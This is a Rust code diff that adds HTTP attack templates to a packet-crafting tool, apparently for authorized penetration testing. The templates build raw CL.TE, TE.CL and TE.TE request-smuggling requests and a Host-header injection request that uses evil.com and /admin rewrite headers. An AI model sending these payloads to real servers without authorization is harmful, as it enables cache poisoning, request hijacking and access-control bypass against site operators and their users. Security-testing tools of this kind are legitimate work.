@@ -389,6 +389,13 @@ pub enum PacketTemplate {
     HttpPost,
     HttpOptions,
 
+    // HTTP Attack Templates (for authorized testing only)
+    HttpSmuggleCLTE,   // CL.TE: Content-Length takes precedence
+    HttpSmuggleTECL,   // TE.CL: Transfer-Encoding takes precedence
+    HttpSmuggleTETE,   // TE.TE: Transfer-Encoding obfuscation
+    HttpHostOverride,  // Host header injection
+    WebSocketUpgrade,  // WebSocket upgrade request
+
     // DNS Templates
     DnsQueryA,
     DnsQueryAAAA,
@@ -417,6 +424,11 @@ impl PacketTemplate {
             PacketTemplate::HttpHead,
             PacketTemplate::HttpPost,
             PacketTemplate::HttpOptions,
+            PacketTemplate::HttpSmuggleCLTE,
+            PacketTemplate::HttpSmuggleTECL,
+            PacketTemplate::HttpSmuggleTETE,
+            PacketTemplate::HttpHostOverride,
+            PacketTemplate::WebSocketUpgrade,
             PacketTemplate::DnsQueryA,
             PacketTemplate::DnsQueryAAAA,
             PacketTemplate::DnsQueryMX,
@@ -440,6 +452,11 @@ impl PacketTemplate {
             PacketTemplate::HttpHead => "HTTP HEAD",
             PacketTemplate::HttpPost => "HTTP POST",
             PacketTemplate::HttpOptions => "HTTP OPTIONS",
+            PacketTemplate::HttpSmuggleCLTE => "Smuggle CL.TE",
+            PacketTemplate::HttpSmuggleTECL => "Smuggle TE.CL",
+            PacketTemplate::HttpSmuggleTETE => "Smuggle TE.TE",
+            PacketTemplate::HttpHostOverride => "Host Override",
+            PacketTemplate::WebSocketUpgrade => "WS Upgrade",
             PacketTemplate::DnsQueryA => "DNS A Query",
             PacketTemplate::DnsQueryAAAA => "DNS AAAA Query",
             PacketTemplate::DnsQueryMX => "DNS MX Query",
@@ -463,6 +480,11 @@ impl PacketTemplate {
             PacketTemplate::HttpHead => "F9",
             PacketTemplate::HttpPost => "F10",
             PacketTemplate::HttpOptions => "-",
+            PacketTemplate::HttpSmuggleCLTE => "-",
+            PacketTemplate::HttpSmuggleTECL => "-",
+            PacketTemplate::HttpSmuggleTETE => "-",
+            PacketTemplate::HttpHostOverride => "-",
+            PacketTemplate::WebSocketUpgrade => "-",
             PacketTemplate::DnsQueryA => "F11",
             PacketTemplate::DnsQueryAAAA => "-",
             PacketTemplate::DnsQueryMX => "-",
@@ -485,7 +507,12 @@ impl PacketTemplate {
             PacketTemplate::HttpGet
             | PacketTemplate::HttpHead
             | PacketTemplate::HttpPost
-            | PacketTemplate::HttpOptions => Protocol::Http,
+            | PacketTemplate::HttpOptions
+            | PacketTemplate::HttpSmuggleCLTE
+            | PacketTemplate::HttpSmuggleTECL
+            | PacketTemplate::HttpSmuggleTETE
+            | PacketTemplate::HttpHostOverride
+            | PacketTemplate::WebSocketUpgrade => Protocol::Http,
             PacketTemplate::DnsQueryA
             | PacketTemplate::DnsQueryAAAA
             | PacketTemplate::DnsQueryMX
@@ -508,7 +535,12 @@ impl PacketTemplate {
             PacketTemplate::HttpGet
             | PacketTemplate::HttpHead
             | PacketTemplate::HttpPost
-            | PacketTemplate::HttpOptions => 80,
+            | PacketTemplate::HttpOptions
+            | PacketTemplate::HttpSmuggleCLTE
+            | PacketTemplate::HttpSmuggleTECL
+            | PacketTemplate::HttpSmuggleTETE
+            | PacketTemplate::HttpHostOverride
+            | PacketTemplate::WebSocketUpgrade => 80,
             PacketTemplate::DnsQueryA
             | PacketTemplate::DnsQueryAAAA
             | PacketTemplate::DnsQueryMX
@@ -558,6 +590,41 @@ impl PacketTemplate {
                 format!(
                     "OPTIONS * HTTP/1.1\r\nHost: {}\r\nUser-Agent: NoirCast/1.0\r\nAccept: */*\r\n\r\n",
                     host
+                ).into_bytes()
+            }
+            // CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
+            PacketTemplate::HttpSmuggleCLTE => {
+                format!(
+                    "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED",
+                    host
+                ).into_bytes()
+            }
+            // TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
+            PacketTemplate::HttpSmuggleTECL => {
+                format!(
+                    "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
+                    host
+                ).into_bytes()
+            }
+            // TE.TE: Transfer-Encoding obfuscation to confuse parsing
+            PacketTemplate::HttpSmuggleTETE => {
+                format!(
+                    "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: x\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n",
+                    host
+                ).into_bytes()
+            }
+            // Host header override/injection for cache poisoning tests
+            PacketTemplate::HttpHostOverride => {
+                format!(
+                    "GET / HTTP/1.1\r\nHost: {}\r\nX-Forwarded-Host: evil.com\r\nX-Host: evil.com\r\nX-Forwarded-Server: evil.com\r\nX-Original-URL: /admin\r\nX-Rewrite-URL: /admin\r\nUser-Agent: NoirCast/1.0\r\n\r\n",
+                    host
+                ).into_bytes()
+            }
+            // WebSocket upgrade request
+            PacketTemplate::WebSocketUpgrade => {
+                format!(
+                    "GET / HTTP/1.1\r\nHost: {}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nOrigin: http://{}\r\n\r\n",
+                    host, host
                 ).into_bytes()
             }
             PacketTemplate::DnsQueryA => Self::build_dns_query(host, 1), // A record
